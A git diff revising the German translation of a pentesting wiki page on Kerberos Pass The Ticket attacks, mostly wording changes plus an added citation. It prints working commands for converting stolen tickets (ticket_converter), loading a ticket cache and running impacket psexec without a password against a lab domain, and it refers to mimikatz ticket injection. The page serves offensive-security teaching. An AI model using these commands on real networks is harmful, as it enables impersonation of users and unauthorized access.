@@ -4,16 +4,16 @@
 
 ## Pass The Ticket (PTT)
 
-Im **Pass The Ticket (PTT)** Angriffsverfahren stehlen Angreifer **das Authentifizierungsticket eines Benutzers** anstelle seines Passworts oder Hash-Werte. Dieses gestohlene Ticket wird dann verwendet, um **den Benutzer zu impersonieren** und unbefugten Zugriff auf Ressourcen und Dienste innerhalb eines Netzwerks zu erhalten.
+Bei der Angriffsmethode **Pass The Ticket (PTT)** **stehlen Angreifer das Authentifizierungsticket eines Benutzers**, anstatt dessen Passwort oder Hashwerte zu stehlen. Dieses gestohlene Ticket wird anschließend verwendet, um **sich als der Benutzer auszugeben** und unautorisierten Zugriff auf Ressourcen und Dienste innerhalb eines Netzwerks zu erlangen.<sup>[[1]](#references)</sup>
 
 **Lesen**:
 
-- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
-- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
+- [Tickets von Windows sammeln](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
+- [Tickets von Linux sammeln](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
 
-### **Swaping Linux and Windows tickets between platforms**
+### **Linux- und Windows-Tickets zwischen Plattformen austauschen**
 
-Das [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) Tool konvertiert Ticketformate nur mit dem Ticket selbst und einer Ausgabedatei.
+Das Tool [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) konvertiert Ticketformate, wobei lediglich das Ticket selbst und eine Ausgabedatei erforderlich sind.
 ```bash
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 Converting ccache => kirbi
@@ -21,9 +21,9 @@ Converting ccache => kirbi
 python ticket_converter.py velociraptor.kirbi velociraptor.ccache
 Converting kirbi => ccache
 ```
-In Windows kann [Kekeo](https://github.com/gentilkiwi/kekeo) verwendet werden.
+Unter Windows kann [Kekeo](https://github.com/gentilkiwi/kekeo) verwendet werden.
 
-### Pass The Ticket Angriff
+### Pass The Ticket Attack
 ```bash:Linux
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
@@ -38,6 +38,6 @@ klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 ```
 ## Referenzen
 
-- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
 {{#include ../../banners/hacktricks-training.md}}
